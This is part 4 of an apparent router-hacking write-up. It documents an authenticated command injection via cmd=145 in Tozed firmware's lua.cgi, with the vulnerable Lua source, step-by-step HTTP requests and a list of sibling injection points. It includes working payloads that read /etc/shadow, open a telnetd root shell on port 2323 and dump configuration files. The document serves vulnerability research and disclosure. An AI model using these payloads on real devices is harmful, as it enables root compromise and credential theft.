# 04 — The `cmd=145` RCE

> 👤 **Author:** Nipun Methmal · Part 4 of 9 · [← Index](../README.md) · [Next →](05-root-shell.md)

**Authenticated OS command injection in the stock Tozed web UI**, reachable through
`POST /cgi-bin/lua.cgi` with `cmd=145`. Root, no shell required.

> ⚠️ **Authorized use only.** This is a real defect in commercial firmware that other people may
> still be running on devices they do not own. Use it only on hardware **you** control. If you find
> it in the wild, report it to the vendor or your ISP — see [Disclosure](#disclosure).

## The dispatch

`lua.cgi` reads the request body, validates a session, and indexes a function table:

```lua
-- lua.cgi
local switch = {
     ...
    [100] = login,
    ...
    [145] = network_tool,     -- ★
     ...
}

-- session gate
local cmd = tz_req["cmd"]
if (cmd ~= 100 and cmd ~= 80 and cmd ~= 133 and cmd ~= 113) then
    local fileName = string.format("/tmp/sessionsave/.%s", tz_req["sessionId"])
    if (uti.is_file_exist(fileName) ~= true) then
        -- {"cmd":N,"success":false}  → rejected
        return
    else
        local f = switch[tz_req["cmd"]]
        if (f) then f() end
        ...
    end
end
```

### The authentication gate

A valid `sessionId` is required. That is a genuine barrier *if* you do not know the password —
which is why it is worth being precise about how it was cleared:

- The account is the stock **`admin`** user. The **password was not the factory default** on this
  unit (it is the author's own device; the password itself is deliberately not recorded here).
- Whatever the password is, it travels as a **bare MD5 over plaintext HTTP**:

  ```
  POST /cgi-bin/lua.cgi   (no TLS)
  "username":"admin","passwd":"<md5-of-password>"
  ```

  So on the LAN it is recoverable from any packet capture — the transport does not protect it, and
  MD5 is the *only* thing standing between a sniffer and a reusable credential.

- Independently, `cmd=5` (file upload) applies its own session check, and every other command
  indexes the same `/tmp/sessionsave/.<sessionId>` file — so a session token obtained by *any*
  means unlocks the whole API, injection included.

Bottom line: this is an **authenticated** RCE. It is not reachable from the internet, and it is not
a default-password bug — but for anyone holding the admin password (or a sniffed copy of it), it is
one `POST` from root.

The handler itself is a one-liner:

```lua
-- lua.cgi
function network_tool()
    local tz_answer = system.system_network_tool(tz_req)
    tz_answer["cmd"] = 145
    tz_answer["success"] = true
    result_json = cjson.encode(tz_answer)
    print(result_json)
end
```

## The vulnerable function

`usr/lib/lua/tz/system.lua`, verbatim:

```lua
local TMP_NETWORK_TOOL_LOG_FILE = "/tmp/log_tar/network_tool_log"
local LOG_FILE_LIMIT = 40960000

function system_module.system_network_tool(tz_req)

    local tz_answer = {}
    if "ping_start" == tz_req["tool"] then
        if "" ~= tz_req["pingUrl"] then
            if "1" == tz_req["pingLoop"] then
                os.execute(string.format("softlimit -f %d ping %s > %s &",
                    LOG_FILE_LIMIT, tz_req["pingUrl"], TMP_NETWORK_TOOL_LOG_FILE))
            else
                if "" == tz_req["pingNum"] then
                    tz_req["pingNum"] = "50"
                end
                os.execute(string.format("softlimit -f %d ping -c %s %s > %s &",
                    LOG_FILE_LIMIT, tz_req["pingNum"], tz_req["pingUrl"],
                    TMP_NETWORK_TOOL_LOG_FILE))
            end
        end
    elseif "get_log" == tz_req["tool"] then
        local f = io.open(TMP_NETWORK_TOOL_LOG_FILE)
        local res = f:read("*a")
        tz_answer["data"] = res
        io.close(f)
    elseif "trace_start" == tz_req["tool"] then
        if "" ~= tz_req["traceUrl"] then
            os.execute(string.format("softlimit -f %d traceroute %s %s > %s &",
                LOG_FILE_LIMIT, tz_req["traceUrl"], tz_req["tracePort"],
                TMP_NETWORK_TOOL_LOG_FILE))
        end
    ...
```

**There is no sanitisation, no allow-list, no escaping and no quoting anywhere in this function.**
`string.format("… %s …")` with `%s` produces a string, and `os.execute` hands that string to
`/bin/sh -c`. So anything shell-significant inside `pingUrl`, `pingNum`, `traceUrl`, `tracePort` or
`catchPackageIfname` is executed as root.

Why the device shells out at all: these are the "Network Tools" page in the vendor UI — ping,
traceroute, packet capture, live log. The developer needed to run those binaries and used the
obvious Lua call.

### The read-back kicker (what makes this remotely practical)

`get_log` reads `/tmp/log_tar/network_tool_log` back into the JSON response. Because the injected
command's own stdout is redirected into that very file, **command output comes back through the
API**. That converts a blind injection into a readable one — no outbound connection, no DNS
callback, nothing to detect.

## Exploitation

**1 — Log in and keep the session**

```powershell
# scripts/web-login.ps1 (sanitised — passwords are parameters, never stored)
$md5pw = MD5($env:P11_WEB_PASS)
POST /cgi-bin/lua.cgi
{"cmd":100,"method":"POST","sessionId":"<client-guid-md5>",
 "username":"admin","passwd":"<md5-of-password>","language":"EN"}
→ {"cmd":100,"success":true,"sessionId":"<sid><server-time>"}
```

**2 — Inject**

```powershell
# scripts/p145-inject.ps1
POST /cgi-bin/lua.cgi
{"cmd":145,"sessionId":"<sid>","language":"EN","method":"POST",
 "tool":"ping_start","pingLoop":"0","pingNum":"1",
 "pingUrl":"127.0.0.1; <command>"}
→ {"cmd":145,"success":true}
```

`pingUrl` is placed between `ping -c 1` and `> /tmp/log_tar/network_tool_log &`, so a `;` (or
`|`, `&&`, backtick, `$(…)`) closes the intended command and runs ours.

**3 — Read the output back**

```powershell
{"cmd":145,"sessionId":"<sid>","language":"EN","method":"POST","tool":"get_log"}
→ {"cmd":145,"success":true,"data":"… command output …"}
```

**4 — Make it persistent** (see [doc 05](05-root-shell.md))

Spawn a shell listener on an unused port and connect to it.

### Working payloads

```sh
# confirm execution
pingUrl = 127.0.0.1;id
pingUrl = 127.0.0.1;uname -a
pingUrl = 127.0.0.1;cat /etc/shadow

# persistence
pingUrl = 127.0.0.1;telnetd -l /bin/sh -p 2323

# exfiltrate the whole config in one shot
pingUrl = 127.0.0.1;cat /etc/config/* > /tmp/out; cp /tmp/out /tmp/log_tar/network_tool_log
```

All of these are reached with a single `POST` and a valid session.

## Why this was the breakthrough

The other injection points ([doc 03](03-reconnaissance.md)) existed but were hard to prove:

- **`logout` (`sessionId`)** — works, but requires a session to invoke in the first place.
- **`change_language` (`languageOld`)** — `sed -i` with unquoted user input; viable, cosmetic.
- **`atCmd`** — `sendat` to `/dev/ttyUSB3`; only meaningful if a modem is attached.

`pingUrl` was different: trivially reachable, and it **returns its own output**. One request in, one
response out.

## Sibling issues (same file, found during the same review)

| Location | Sink | Input |
|---|---|---|
| `lua.cgi:116` | `os.execute("rm /tmp/sessionsave/." .. sessionId)` | `sessionId` |
| `lua.cgi:146` | `os.execute("sed -i 's/%s.js/…' …")` | `languageOld`, `languageSelect` |
| `lua.cgi:1418` | `io.popen("sendat -d/dev/ttyUSB3 -e %s")` | `atCmd` |
| `system.lua:207/213` | `os.execute("… ping … %s …")` | `pingUrl`, `pingNum` |
| `system.lua:254` | `os.execute("… traceroute %s %s …")` | `traceUrl`, `tracePort` |
| `system.lua:236` | `os.execute("… tcpdump -i %s …")` | `catchPackageIfname` |
| `lua.cgi` `cmd=0` | — | Returns the Wi‑Fi PSK to any valid session |

## Disclosure

I am publishing this because the device I own has been completely replaced with OpenWrt, and
because the analysis is the interesting part of this project. The right thing to do next is
**report it to Tozed and/or the ISP** so units still in service can be patched.

If you are a vendor reading this: I would rather coordinate on a timeline than have this surface
somewhere less friendly. Reach out.

---

> 📖 Next: [05 — Getting a root shell](05-root-shell.md)

---
> ✍️ © 2026 **Nipun Methmal** · MIT License · *p11idu-openwrt-repeater*
